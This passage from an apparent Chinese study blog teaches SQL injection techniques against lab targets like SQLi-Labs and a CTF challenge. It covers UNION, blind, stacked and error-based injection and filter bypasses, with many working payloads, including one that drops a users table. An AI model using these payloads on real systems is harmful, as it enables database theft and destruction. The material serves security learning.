+<p>payload:?id&#x3D;-1’ UNION SELECT 1,group_concat(flag),3 FROM flag–+</p>
+<p><img src="/images/DYScbC3PWoxuFKxRX3Jc8og7nwf.png"></p>
+<p>那答案就出来了.</p>
+<h2 id="数字型-UNION-注入"><a href="#数字型-UNION-注入" class="headerlink" title="数字型 UNION 注入"></a>数字型 UNION 注入</h2><p>数字型注入比字符型更容易,以上一题为例,在 payload: ?id&#x3D;2-1 的时候能输出 id&#x3D;1 时的用户名和密码,就为数字型注入.不用找到闭合方式，直接往下判断查询列数就可以了.</p>
+<p>Payload: ?id&#x3D;1 GROUP BY 4 –+ 这样</p>
+<p>查询表名的时候:</p>
+<p>?id&#x3D;-1’ UNION SELECT 1,group_concat(TABLE_NAME),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+</p>
+<p>可以用括号等价于:</p>
+<p>?id&#x3D;-1’ UNION SELECT 1,<strong>(<strong>SELECT group_concat(TABLE_NAME) FROM information_schema.tables WHERE table_schema&#x3D;database()</strong>)</strong>,2 –+</p>
+<p>利用红色的 SELECT 他在无 FROM 时遇到不存在的列会直接回显不存在的列名,来让其直接回显 TABLE_NAME 里面的内容</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注和时间盲注两种。</p>
+<p>在<strong>页面没有报错回显，也不知道数据库具体返回值</strong>的情况下，对数据库中的内容进行猜解，实行盲注。</p>
+<p><strong>布尔盲注</strong>则指的是 web 页面只返回 True 真，False 假两种类型。利用页面返回不同，<strong>逐个猜解</strong>数据。</p>
+<p>例如我 payload ?id&#x3D;1,页面会响应,输出一行或者若干行,但是不会显示数据库的具体内容</p>
+<p>Payload ?id&#x3D;’1,页面不会正常输出,也不会显示报错</p>
+<p>这种网页的回显只有真(正常输出)或者假(非正常输出)的题型,则属于<strong>布尔盲注</strong>题型</p>
+<h3 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h3><p>ASCII() 返回 ASCII 码,注意如果括号中是字符或者字符串的话,一定要加单引号.</p>
+<p>SELECT ASCII(‘A’)</p>
+<p>会输出 65</p>
+<p>此外,ASCII()函数只会转换括号中字符串的第一个字符的 ASCII</p>
+<p>SELECT ASCII(‘AWZ’)</p>
+<p>依然会输出 65.</p>
+<p>SUBSTR(&lt; 内容 &gt;,&lt; 第 m 个字符 &gt;,&lt; 第 n 个字符 &gt;)</p>
+<p>这个函数能够返回内容中从第 m 个字符开始的后 n 个字符(包括第 m 个字符),配合 ASCII(),能够得到一个字符串中特定位置</p>
+<p>的字符的 ASCII 值.</p>
+<p>例如 ASCII**(<strong>SUBSTR(SELECT DATABASE()),1,1</strong>)**就能得到 DATABASE()中第 1 个(从 1 开始)字符的 ASCII 值</p>
+<h3 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h3><p><strong>比较 ASCII 值</strong></p>
+<p>和一般的解题步骤一样，找到闭合方式，判断查询列数，都可以通过页面的真假来解决.</p>
+<p>但查询表名和列名时，由于他不会回显，我们只能想办法得到查询的表名和列名的 ASCII 值</p>
+<p>再翻译回来.</p>
+<p>以查询表名(闭合方式为单引号,3 列)为例,正常的 payload 是:</p>
+<p>?id&#x3D;-1’ UNION SELECT 1,group_concat(TABLE_NAME),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+</p>
+<p>会直接返回 database 数据库下所有的表名</p>
+<p>但当页面只会返回命令的真假时,用</p>
+<p>?id&#x3D;-1’ AND ASCII**(<strong>SUBSTR((SELECT group_concat(TABLE_NAME) FROM information_schema.tables WHERE table_schema&#x3D;database()),1,1)</strong>)&gt;&#x3D;100 –+**</p>
+<p>判断 database()数据库下所有表名的第一个字符的 ASCII 码能否超过 100(超过则网页正常回显,小于则不回显)</p>
+<p>再使用二分法等,判断能否超过 110,90 等等,从而获得所有表名的第一个字符的 ASCII 码</p>
+<p>用这个方式,改变 SUBSTR 的参数,获得第二,第三……个字符的 ASCII 码，再进行转码,即可成功查询列名和表名</p>
+<p>或者不用 group_concat 包裹也行,因为不会回显,最后再加上个 LIMIT 0,1 也可以获得所有表名的 ASCII 码(表示从第 0 行开始显示 1 行)</p>
+<p>?id&#x3D;-1’ AND ASCII**(<strong>SUBSTR((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema&#x3D;database() LIMIT 0,1),1,1)</strong>)&gt;&#x3D;100 –+**</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><strong>时间盲注</strong>指的是 web 页面只返回一个正常页面，利用页面响应时间不同，逐个猜解数据。</p>
+<p>注:前提是数据库会执行命令代码，只是不反馈页面信息</p>
+<h3 id="关键函数-1"><a href="#关键函数-1" class="headerlink" title="关键函数"></a>关键函数</h3><p>Sleep()</p>
+<p>Sleep(秒数)代表延迟多少秒</p>
+<p>if()</p>
+<p>if(condition,I,II)</p>
+<p>类似三目运算符,如果 condition 为 true,则执行 I 中代码,否则执行 II 中代码</p>
+<h3 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h3><p>如果这个网页连真假值都不会显示了，那么可以用 if 短句配合 Sleep()函数,观察网页响应时间来</p>
+<p>判断执行的语句是否为真.</p>
+<p><img src="/images/XuaQbDkbWoiaQJxtn5rcPS0dnhg.png"></p>
+<p>select 在这里充当命令执行的工具</p>
+<p>在判断闭合方式的时候,也可以用 id&#x3D;?? and sleep(3)</p>
+<p>判断网页是否等待了 3s 响应,如果响应,则代表代码正常执行了.</p>
+<p>获取用户名和密码&#x2F;闭合符判断举例:</p>
+<p><img src="/images/OFLxb3NBTopeBQxWMkochN1RnTf.png"></p>
+<p><img src="/images/Q5qKbpvEno7JJBxpWpOczStbnZB.png"></p>
+<p>上面四条语句哪个可以正常执行则哪个闭合符是正确的.</p>
+<p>查询耗时可以在网络处查询.</p>
+<p><img src="/images/ALUTbkdx7oSgiax6sLRcrPIrnZ9.png"></p>
+<h3 id="关于盲注的补充函数"><a href="#关于盲注的补充函数" class="headerlink" title="关于盲注的补充函数"></a>关于盲注的补充函数</h3><h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><p>length(字符串)返回字符串长度</p>
+<p>可以用?id&#x3D;1 AND length(database())&#x3D;1&#x2F;2&#x2F;3&#x2F;4</p>
+<p>依次输入以爆破出 database()的数据长度</p>
+<p>当然,用大于等于&#x2F;小于等于效果更佳.</p>
+<h4 id="SUBSTR"><a href="#SUBSTR" class="headerlink" title="SUBSTR()"></a><strong>SUBSTR()</strong></h4><p><code>SUBSTR()</code> 函数还可以用于替换字符串中的某个字符(在只知道 username 的长度,而不知道具体值的时候)：</p>
+<p>UPDATE users SET username&#x3D;SUBSTR(username,1,3)||’***’||SUBSTR(username,7) WHERE username&#x3D;’admin’</p>
+<p>将管理员账户的用户名中的第 4 到第 6 个字符替换为 <code>***</code></p>
+<h4 id="MID"><a href="#MID" class="headerlink" title="MID()"></a>MID()</h4><p><code>MID()</code> 函数也是用于截取字符串的函数,这点和 SUBSTR()相似。</p>
+<p><code>MID(string, start, length)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MID(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;；</span><br><span class="line">SUBSTR(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;。</span><br></pre></td></tr></table></figure>
+
+<h4 id="CONCAT"><a href="#CONCAT" class="headerlink" title="CONCAT()"></a><code>CONCAT()</code></h4><p><code>CONCAT()</code> 函数用于将多个字符串连接成一个字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONCAT(string1, string2, ...)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 union select CONCAT(username,&#x27;-&#x27;,password),1 from users;</span><br></pre></td></tr></table></figure>
+
+<p>一定程度上和 GROUP_CONCAT 类似</p>
+<p><img src="/images/Rengbs1VuoUCSNx6XIScG56cn7c.png"></p>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>顾名思义 就是一堆 SQL 语句 (多条) 一起执行方法被称为堆叠注入。</p>
+<p>其实讲原理就很容易懂：</p>
+<p>在执行 SQL 语句时，如果 SQL 语句中包含多个 SQL 语句，数据库服务器会依次执行这些 SQL 语句，从而导致多次 SQL 注入攻击。通过在 SQL 语句中使用分号（;）来分隔多个 SQL 语句，从而实现堆叠注入攻击。</p>
+<p>举个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id =1; DROP TABLE users;--</span><br></pre></td></tr></table></figure>
+
+<p>执行这个 SQL 语句时，数据库服务器会依次执行这两个 SQL 语句，将会查询到 <code>users</code> 表中的用户名和密码，并且将 <code>users</code> 表删除。</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>即通过报错信息获取数据的方法,用于 UNION 无法正常回显的情况(优先级比盲注更先)</p>
+<p>实际上在 UNION 学习中接触到的 GROUP BY&#x2F;ORDER BY+ 数字,用是否报错判断列数,本质</p>
+<p>上也是一种报错注入.</p>
+<p>FROM 错误的表格得到 &lt; 当前数据库名 &gt;.&lt; 表名 &gt; 不存在,实际上也是一种报错注入的方式获得了当前的数据库名.</p>
+<h3 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue 报错注入"></a>extractvalue 报错注入</h3><p>对于报错注入,我们需要<strong>构造语句，让错误信息中夹杂可以显示数据库内容的查询语句</strong></p>
+<p>先来看这个函数的正确用法:</p>
+<p><img src="/images/Gz7obxLOtoYpQuxRDZqculI7nlh.png"></p>
+<p>这里 doc 是列名,第二个参数是一个路径,这个函数正常情况能够<strong>返回用于查询的字符串,可以作为 SELECT 的一个参数</strong></p>
+<p>FROM 和 select 连接的,表示在 xml 表中查询.</p>
+<p>我们要做的就是让这个函数报错</p>
+<p>这里面 <strong>doc 可以直接输,且输什么都不会报错</strong>,但后面的路径一定要以&#x2F;开头,否则整个函数就会报错了</p>
+<p>我们可以用下列语句:</p>
+<p><img src="/images/L1C7brwt7og0hvx2iONcEafhnTe.png"></p>
+<p>这样报错信息就会<strong>提示错误的路径</strong></p>
+<p>因此我们可以在路径中做文章,将 select 语句填写入路径参数,再让整个函数报错,获得 select 命令的执行结果.</p>
+<p>我们尝试以下语句:</p>
+<p><img src="/images/SV66bukrooQ4kRx48nCc8SQNnnf.png"></p>
+<p>获得报错:</p>
+<p><img src="/images/NYFfb3iLBoSwymxpxh2ccAw9ngg.png"></p>
+<p>即得 database 的返回值是 ctfstu</p>
+<p><strong>这样就可以用报错内容输出 SELECT 函数能够输出的任意值了</strong></p>
+<p><em>注意: 这里的 0x7e</em>_ 就是 <strong>~</strong> 的 “安全写法”，在 SQL 注入中专门用来做数据分隔，让提取的敏感信息更清晰，同时避免语法报错。相当于 concat(‘~’ select database())_</p>
+<p>concat()起拼接作用,将~和 select dabase()的返回值给拼接起来了</p>
+<p>当然,这个函数也不一定要跟在 SELECT 后</p>
+<p><img src="/images/ObkPbMfcNoUsv7xxayOcrp1Vncg.png"></p>
+<p>And 能让这个函数报错,也可行,而且还省略了获取列名这个过程,更为推荐.</p>
+<h3 id="解决报错只能显示-32-字符的问题"><a href="#解决报错只能显示-32-字符的问题" class="headerlink" title="解决报错只能显示 32 字符的问题"></a>解决报错只能显示 32 字符的问题</h3><p>substr&#x2F;substring 函数(两个函数等价)</p>
+<p>SUBSTR(&lt; 内容 &gt;,&lt; 第 m 个字符 &gt;,&lt; 第 n 个字符 &gt;)</p>
+<p>这个函数能够返回内容中从第 m 个字符开始的后 n 个字符(包括第 m 个字符)</p>
+<p>例如 SUBSTR((SELECT DATABASE()),1,1)就能返回 DATABASE()中第 1 个(从 1 开始)字符</p>
+<p>把 SELECT 的结果用括号括起来,就可以获得特定字符的值了</p>
+<p><u>我们再用一个示例来巩固报错注入的知识</u></p>
+<p>当然用 SELECT SUBSTR(DATABASE()),1,1 也行,效果是一样的</p>
+<h3 id="SQLi-Labs-5-解题示例"><a href="#SQLi-Labs-5-解题示例" class="headerlink" title="SQLi-Labs-5 解题示例"></a>SQLi-Labs-5 解题示例</h3><p><img src="/images/UvYibKrKyoISMDxn4bmcZamenNl.png"></p>
+<p>进入到关卡界面,发现根本没有回显位</p>
+<p><img src="/images/QzpnbmqFVoydvCx7g83cb674nLh.png"></p>
+<p>输入一下错误的指令,看下会不会报错,会就是报错注入,不会就是盲注了</p>
+<p><img src="/images/Z12dbQlnSopfHNxyCvJcZZoGnwe.png"></p>
+<p>会报错,而且看样子是单引号闭合方式,于是采用报错注入</p>
+<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue(1,concat(‘~’,(SELECT database()))) –+</p>
+<p><img src="/images/CSG8bWY5BoZvFGxcfGpcHjjDn0d.png"></p>
+<p>知道了当前数据库名是 security,接下来获取一下表名和列名</p>
+<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue**(<strong>1,concat(‘~’,(SELECT group_concat(TABLE_NAME) FROM information_schema.tables WHERE table_schema&#x3D;database()))</strong>)** –+</p>
+<p><img src="/images/TlqsbZY0fovpUXx6n1dcd4u6nOb.png"></p>
+<p>看到 flag 这个表名了,接下来看看 flag 这个表里面有什么列</p>
+<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue**(<strong>1,concat(‘~’,(SELECT group_concat(COLUMN_NAME) FROM information_schema.columns WHERE table_schema&#x3D;database() AND table_name&#x3D;’flag’))</strong>)** –+</p>
+<p><img src="/images/BWnhbQGUTo170Sx0sqlcfXFInih.png"></p>
+<p>有一列叫 flag 的</p>
+<p>那下面只需要查看 flag 表中的 flag 列就能得到 flag 了</p>
+<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue(1,concat(‘~’,(SELECT flag FROM flag))) –+</p>
+<p><img src="/images/Ah5obP8FboEN1gxJYjqcECA1nXg.png"></p>
+<p>回显了一部分 flag,还得用 SUBSTR 函数回显后半部分,以第 30 字符为起始</p>
+<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue(1,concat(‘~’,(SUBSTR((SELECT flag FROM flag),30,30)))) –+</p>
+<p>这里要看懂括号,任何以指令返回的字符串都要加括号</p>
+<p><img src="/images/DUNobyPIsotJ8pxXikjcNZI2nih.png"></p>
+<p>前面的 cc 是一开始的第 31 32 字符,所以 flag 应该是前半段加后半段 0622cb</p>
+<p>即得完整的 flag!</p>
+<h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml 报错注入"></a>updatexml 报错注入</h3><p>与 extractvalue 报错注入原理上相似，但参数不同</p>
+<p><img src="/images/OTpXbM1wpox6QJx3KGecoRLMncs.png"></p>
+<p>这个函数是用于更新数据的,但是我们只用知道它怎么才能报错,报错回显什么,再利用这个性质就可以了.</p>
+<p>与 extractvalue 报错相同,这里也是路径不用&#x2F;开头就会报错,剩下第一,第三个参数瞎填任意字符即可.</p>
+<p><img src="/images/WKcNbUPpSoknObxjB86cvxSknJ4.png"></p>
+<p>报错也只能回显 32 字符,可以用 SUBSTR 控制字符输出</p>
+<p>查看表名,直接 payload:</p>
+<p>?id&#x3D;-1’ AND 1&#x3D;UPDATEXML(1,CONCAT(‘~’,(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;DATABASE())),3) –+</p>
+<p>对照一下下面的(加了个 GROUP_CONCAT)</p>
+<p><img src="/images/M71ubjkWxoCU0RxTCRFcXwjHnwh.png"></p>
+<p>这里 SUBSTR 套在了 SELECT 后面,也是一样的,套在 SELECT 前是一样的</p>
+<p><img src="/images/ILAab6Zv3oG7UJxHQXkcoQHrnoc.png"></p>
+<p>对照一下放 SELECT 前</p>
+<p><img src="/images/JtAlboiWtoGLAfxKOxscVl4sn6e.png"></p>
+<h3 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor 报错注入"></a>floor 报错注入</h3><h4 id="涉及到的函数"><a href="#涉及到的函数" class="headerlink" title="涉及到的函数"></a>涉及到的函数</h4><p><strong>rand() 随机返回 0 到 1 之间的小数</strong></p>
+<p>Select rand() from users; 列 users 有多少行，这个语句便会计算多少次 rand(),并输出为未命名的一列</p>
+<p><strong>floor() 小数向下取整数</strong></p>
+<p>Select floor(2*rand()); 随机输出 0 或 1</p>
+<p><strong>ceiling() 小数向上取整数</strong></p>
+<p><strong>concat_ws(1,2,3) 将括号内数据用第 1 个字段连接起来</strong></p>
+<p>SELECT concat_ws(‘<del>‘,2,3); 输出 2</del>3</p>
+<p>可以看看上面三个命令合一以后的输出结果:</p>
+<p><img src="/images/Qs0HbLdfvoxqWrxo0Zicexswnjh.png"></p>
+<h5 id="FROM-接管问题"><a href="#FROM-接管问题" class="headerlink" title="*FROM 接管问题"></a>*FROM 接管问题</h5><p><em>注:这里的 from users 管一整个 SELECT 语句,包括 rand(),因此 rand 才可以输出那么多</em></p>
+<p><em>所有的 from 都能管一整个 select 语句,例如 SELECT 1,A,3 FROM USERS,就算表 USERS 只有列 A,那</em></p>
+<p><em>也能管到 A 并输出 A,而 1,3 直接按数字输出.</em></p>
+<p><strong>group by() 对结果集进行分组</strong></p>
+<p><strong>as 别名</strong></p>
+<p><img src="/images/Uv88bBu6Qoj2iExOkEJcc5C8nac.png"></p>
+<p>这里的 as a 是接 concat_ws 的</p>
+<p>为 concat_ws 的结果(一整列)起一个别名”a”,也可以理解成列名</p>
+<p>from 照常管一整句</p>
+<p>group by a 直接只输出 security-0 和 security-1.</p>
+<p><img src="/images/JCtIbl2B3oiiYcxaKlZcFqm9ny6.png"></p>
+<p><strong>count() 汇总统计数量</strong></p>
+<p><img src="/images/EAW6bxNYao7RDqxU0rFc4pZzngP.png"></p>
+<p>count(*)管 concat_ws 返回的列,会统计 security-0 和 security-1 出现次数并输出成另一列.</p>
+<p><strong>这就是问题所在,因为带 count(*)的如图语句有一定可能性会报错.</strong></p>
+<p>这时候 SELECT database()的结果:security 就出来了</p>
+<p><img src="/images/KbcIb5H5IolDoZxfX8YcX4XVnPe.png"></p>
+<p>其成因是在 <strong>rand()函数的纰漏</strong></p>
+<p><img src="/images/WKBPbbvkLoU8jAxxKL9c3ughnMh.png"></p>
+<p>(反正这个函数就是会抽风)</p>
+<p>而我们需要做的,就是让偶尔变成始终:</p>
+<p>让 rand()产生足够多次的计算,使这个报错出现概率逐增</p>
+<p>可以将 from 的列改成行数比较多的列,例如 information_schema.tables,让 rand()执行的次数足够多,这样就能让其报错了</p>
+<h4 id="随机数种子"><a href="#随机数种子" class="headerlink" title="随机数种子"></a>随机数种子</h4><p>在 rand()括号里面填同样数字,rand()会循环输出一些同样的 0-1 数据</p>
+<p>所以 rand(0)会报错,rand(0)就一直会报错,我们 payload 的时候发现 rand(一个数)它一直报错,本题就可以一直用这个数了.</p>
+<h4 id="核心语句"><a href="#核心语句" class="headerlink" title="核心语句"></a>核心语句</h4><p>实际上 floor 报错注入的核心语句就是结合 UNION 进行 SELECT,因为无论是 COUNT()函数还是 CONCAT_WS()函数作为最外层的函数,它们总是输出一个完整的列.</p>
+<p>?id&#x3D;1’ UNION SELECT 1,COUNT(<em>),CONCAT_WS</em><em>(<em>*’-‘,(SELECT DATABASE()),FLOOR(rand(0&#x2F;1&#x2F;2……)*2)**)</em></em> as name**,3** FROM information_schema.tables GROUP by name <strong>–+</strong></p>
+<p>真正需要修改的就是 SELECT DATABASE()，让其输出你想要的数据，并报错出来</p>
+<p>这个 as name 是管到 CONCAT_WS 前的 和 COUNT(*)是无关的.最后整个 SELECT 列</p>
+<p>注:这里红体划线字,3 要删去,因为 COUNT(*)还输出了一列,一共是输出两列,原本它需要三列,加个 1 就行了</p>
+<h4 id="GROUP-CONCAT-问题"><a href="#GROUP-CONCAT-问题" class="headerlink" title="GROUP_CONCAT()问题"></a>GROUP_CONCAT()问题</h4><p>这个语句遇到中间金色字的 GROUP_CONCAT 有时候会因为字符过多就产生 bug 直接不响应</p>
+<p>可以换成 CONCAT+LIMIT 来输出整列.</p>
+<p>GROUP_CONCAT(USERNAME,’~’,PASSWORD)</p>
+<p>&#x3D;CONCAT(USERNAME,’~’,PASSWORD) LIMIT 第 m 行 1(代表输出 1 行)</p>
+<p>或者用 substring 限制一下输出的字符量(详见解题示例)</p>
+<h3 id="SQLi-Labs-2-解题示例"><a href="#SQLi-Labs-2-解题示例" class="headerlink" title="SQLi-Labs-2 解题示例"></a>SQLi-Labs-2 解题示例</h3><p>我们再用一个示例来巩固 floor 报错,注意这是 UNION 注入的题,但一般只要能报错,UNION 注入的题也能报错注入</p>
+<p><img src="/images/GT1qb0Ezao08UhxCG4Dcy2a2nlc.png"></p>
+<p>本题是最简单的数字型注入，不用判断闭合方式.</p>
+<p><img src="/images/Mn3tbj4sLoXEYUxKovhcMF1pnne.png"></p>
+<p><img src="/images/UoAebgwuloZiXyxOngsczQ29nJc.png"></p>
+<p>用 ORDER BY 发现列数为 3,调试并检验</p>
+<p><img src="/images/NLslbPwUwo90U9xdE5Qc7GFsnwg.png"></p>
+<p>这里我们把第二列当做回显列</p>
+<p>payload:</p>
+<p>?id&#x3D;1’ UNION SELECT 1,COUNT(*),CONCAT_WS(‘-‘,(SELECT DATABASE()),FLOOR(rand(0)*2)) as name<del>,3</del> FROM information_schema.tables GROUP by name –+</p>
+<p>用 information_schema.tables 因为它列更多更容易报错了.</p>
+<p><strong>这里注意的是 COUNT 前不要带括号</strong></p>
+<p><img src="/images/FxNpbvFcKoTmmexqZOmcZVI3nbg.png"></p>
+<p>获得 database()的内容’security’</p>
+<p>payload:</p>
+<p>?id&#x3D;1’ UNION SELECT 1,COUNT(*),CONCAT_WS(‘-‘,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA&#x3D;database()),FLOOR(rand(0)*2)) as name FROM information_schema.tables GROUP by name –+</p>
+<p><img src="/images/U4q8bGc46oQJGyx6T15cLPs3nqc.png"></p>
+<p>那加个 GROUP_CONCAT</p>
+<p>Payload:</p>
+<p>?id&#x3D;1’ union select 1,count(*),concat_ws(‘-‘,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),floor(rand(0)*2))as aa from information_schema.tables group by aa–+</p>
+<p><img src="/images/MsXbbl6mboN6LBxwtqocVWZQnKh.png"></p>
+<p>直接啥也没报,可能出现了 GROUP_CONCAT 问题,再用 substring 限制一下输出的字符量</p>
+<p>?id&#x3D;0’ union select 1,count(*),concat_ws(‘-‘,(select substring(group_concat(table_name),1,20)from information_schema.tables where table_schema&#x3D;database()),floor(rand(0)*2))as aa from information_schema.tables group by aa–+</p>
+<p><img src="/images/SzKRbXsKGo7ukexfjLMcsyLKnvf.png"></p>
+<p>这样表名就出来了,列名同理,这里就不再赘述.</p>
+<h2 id="部分过滤绕过"><a href="#部分过滤绕过" class="headerlink" title="部分过滤绕过"></a>部分过滤绕过</h2><p>这里挑几个 SQL 过滤绕过学习一下.</p>
+<p><img src="/images/EFO7bVeD6oXfxmx8iy9chlWjn3e.png"></p>
+<h3 id="注释符号过滤"><a href="#注释符号过滤" class="headerlink" title="注释符号过滤"></a>注释符号过滤</h3><p>先看看过滤的源代码</p>
+<p><img src="/images/BA4eb0AxZoIVRzx1lUhcgvT4n60.png"></p>
+<p>注释符号过滤的方法有很多种。</p>
+<p><strong>1.用 and 语句手动闭合单引号</strong></p>
+<p>?id&#x3D;1’ AND 1&#x3D;1’</p>
+<p>黄底 1’已经完成了闭合,后面 AND 1&#x3D;1’可以和另一个单引号闭合</p>
+<p><em>注:如果是数字型就可以不用注释符进行闭合,代码后的–+ 可以省略</em></p>
+<p><strong>2.直接用’(不一定可行)</strong></p>
+<p>?id&#x3D;1’ ‘</p>
+<p>自动把后面那个单引号给闭合了,但这种方式在有的实验不可行.</p>
+<p><strong>3.用 or 语句手动闭合单引号</strong></p>
+<p>?id&#x3D;1’ or&#x2F;and 1&#x3D;’1</p>
+<p>单引号直接闭合等号后面的 1,1&#x3D;1,语法正确.</p>
+<p>下面这张图能够更稳定的绕过注释过滤.</p>
+<p><img src="/images/ZzKUbEdQco1G9BxikIIcuTL5nt5.png"></p>
+<h3 id="And-和-Or-过滤"><a href="#And-和-Or-过滤" class="headerlink" title="And 和 Or 过滤"></a>And 和 Or 过滤</h3><p><img src="/images/GtafbGzkVob8AyxSx1ScGRxrnze.png"></p>
+<p>对于 and 和 or 过滤:</p>
+<p><strong>1.使用大小写过滤</strong></p>
+<p>?id&#x3D;1’ anD 1&#x3D;1–+</p>
+<p><strong>2.复写过滤字符</strong></p>
+<p>?id&#x3D;1’ an<del>and</del>d 1&#x3D;1 –+</p>
+<p><strong>3.用&amp;&amp;(%26%26)取代 and,用 ||(%7C%7C)取代 or</strong></p>
+<p>三个方法不一定全部适用,要逐一尝试</p>
+<h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p><strong>1.用加号代替空格</strong></p>
+<p>?id&#x3D;1’+and+1&#x3D;1 –+</p>
+<p><strong>2.用 URL 编码代替空格(%0A 更为推荐)</strong></p>
+<p><img src="/images/UKoGbnIycouyeNxMPqGchSV7n9g.png"></p>
+<p><strong>3.使用括号代替空格的格式</strong></p>
+<p><img src="/images/OOVgbajvfopg6txY0DDc7UdvnCd.png"></p>
+<p><strong>注意过滤 or 的时候,也会把 information 里面的 or 给过滤了，记得复写!</strong></p>
+<h3 id="SELECT-和-UNION-过滤"><a href="#SELECT-和-UNION-过滤" class="headerlink" title="SELECT 和 UNION 过滤"></a>SELECT 和 UNION 过滤</h3><p><strong>1.没过滤注释符时,可插入&#x2F;</strong>&#x2F;**</p>
+<p>如这样 uni&#x2F;**&#x2F;on</p>
+<p><strong>2.复写单词过滤&#x2F;大小写过滤</strong></p>
+<p>同 And&#x2F;Or 过滤</p>
+<h3 id="过滤绕过举例"><a href="#过滤绕过举例" class="headerlink" title="过滤绕过举例"></a>过滤绕过举例</h3><p>对于过滤绕过举例,详见 SQL 注入实战第三题</p>
+<h1 id="Week4-3-实验-SQL-注入实战"><a href="#Week4-3-实验-SQL-注入实战" class="headerlink" title="*[Week4.3]实验:SQL 注入实战"></a>*[Week4.3]实验:SQL 注入实战</h1><h2 id="SWPUCTF-2024-秋季新生赛-ez-sql"><a href="#SWPUCTF-2024-秋季新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2024 秋季新生赛]ez_sql"></a>[SWPUCTF 2024 秋季新生赛]ez_sql</h2><p><img src="/images/NOzRbPc9JoszlqxzhNIcFPUunpC.png"></p>
+<p>来到题目,他要你输入 id,这还是 SQL 注入的典型题,我们尝试输入 id&#x3D;1 和 2-1</p>
+<p><img src="/images/VouXbgQ5noRixFxSXxocTpbTnwb.png"></p>
+<p><img src="/images/Kl7RbNp2OoQFGAxqtrWc8o3Hnch.png"></p>
+<p>id 输 2-1 还是当做 2 看待,说明是字符型注入</p>
+<p><img src="/images/KkLvbdykgoM68KxpZcWcnGdfnBc.png"></p>
+<p>输’1 发现很明显的是单引号闭合</p>
+<p>我们先尝试一下报错注入,因为它不用知道列数.</p>
+<p>payload:</p>
+<p>1’  AND 1&#x3D;UNDATEXML(1,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA&#x3D;DATABASE()),3) –+</p>
+<p><img src="/images/FI0XbfqLdoCUR4xtCNYcNKYonZf.png"></p>
+<p>报错了,经过一系列排除,发现–+ 注释在这个环境不适用,用#可以得到不同的结果</p>
+<p><img src="/images/JxrLblc7ro8rZDxNKYKctOV4n4g.png"></p>
+<p>这个函数直接报不存在了,换一个 extractvalue</p>
+<p>Payload:</p>
+<p>1’  AND 1&#x3D;extractvalue(1,CONCAT(‘~’,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA&#x3D;DATABASE()))) #</p>
+<p><img src="/images/LxwvbUwHnonsVixg4crc3WRunHe.png"></p>
+<p>可能是报错的行数多于一行了,用 substr 限定一下</p>
+<p>Payload:</p>
+<p>1’  AND 1&#x3D;extractvalue(1,CONCAT(‘~’,(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA&#x3D;DATABASE()),1,1)))) #</p>
+<p><img src="/images/U4LSbiQWDod89yxIdVfcZfEinrg.png"></p>
+<p>还是不行,只能用 UNION 注入了</p>
+<p>随后的 UNION 注入过程和 Lab-1 是相同的,故省略.</p>
+<h3 id="做题启示"><a href="#做题启示" class="headerlink" title="做题启示"></a>做题启示</h3><p>1.注释用–+ 还是#随环境改变,不一定哪个方式是一定可行的</p>
+<p>2.有的环境不能用报错注入,注入方式需按环境变通</p>
+<h2 id="Less-6-解决前一题的-more-than-问题"><a href="#Less-6-解决前一题的-more-than-问题" class="headerlink" title="Less-6(解决前一题的 more than 问题)"></a>Less-6(解决前一题的 more than 问题)</h2><p>很容易判断闭合方式是双引号,而且是个没有回显的报错注入,正当以为要拿 flag 的时候这个提示又出现了:</p>
+<p><img src="/images/UUovbjXA0okIfSxGqrvcOX5pnrf.png"></p>
+<p>问了下 AI，实际上这并非不允许报错注入</p>
